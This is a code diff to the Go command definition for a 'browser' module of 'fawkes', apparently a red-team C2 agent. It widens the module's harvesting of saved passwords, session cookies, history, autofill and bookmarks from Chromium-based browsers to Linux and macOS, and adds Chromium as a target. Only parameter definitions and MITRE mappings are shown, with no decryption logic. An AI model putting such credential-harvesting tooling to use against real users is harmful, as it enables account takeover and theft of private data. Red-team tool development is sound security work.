@@ -9,15 +9,19 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "browser",
-		Description:         "Harvest saved credentials, cookies, history, autofill data, and bookmarks from Chromium-based browsers (Chrome, Edge) via DPAPI + AES-GCM decryption (T1555.003, T1217)",
-		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks>] [-browser <all|chrome|edge>]",
-		Version:             2,
+		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium). Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, and bookmarks. (T1555.003, T1217)",
+		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks>] [-browser <all|chrome|edge|chromium>]",
+		Version:             3,
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
 		MitreAttackMappings: []string{"T1555.003", "T1217"},
 		ScriptOnlyCommand:   false,
 		CommandAttributes: agentstructs.CommandAttribute{
-			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			SupportedOS: []string{
+				agentstructs.SUPPORTED_OS_WINDOWS,
+				agentstructs.SUPPORTED_OS_LINUX,
+				agentstructs.SUPPORTED_OS_MACOS,
+			},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -26,8 +30,8 @@ func init() {
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks"},
-				Description:      "What to harvest: passwords (saved logins), cookies (session tokens), history (browsing URLs), autofill (form data), or bookmarks (saved URLs).",
-				DefaultValue:     "passwords",
+				Description:      "What to harvest: passwords and cookies (Windows only — requires DPAPI), history (browsing URLs), autofill (form data), or bookmarks (saved URLs).",
+				DefaultValue:     "history",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -40,8 +44,8 @@ func init() {
 				ModalDisplayName: "Browser",
 				CLIName:          "browser",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"all", "chrome", "edge"},
-				Description:      "Which browser to target. 'all' checks both Chrome and Edge.",
+				Choices:          []string{"all", "chrome", "edge", "chromium"},
+				Description:      "Which browser to target. 'all' checks Chrome, Edge, and Chromium. 'chromium' targets open-source Chromium specifically.",
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -73,7 +77,7 @@ func init() {
 			}
 			action, _ := taskData.Args.GetStringArg("action")
 			if action == "" {
-				action = "passwords"
+				action = "history"
 			}
 			display := fmt.Sprintf("%s %s", action, browser)
 			response.DisplayParams = &display
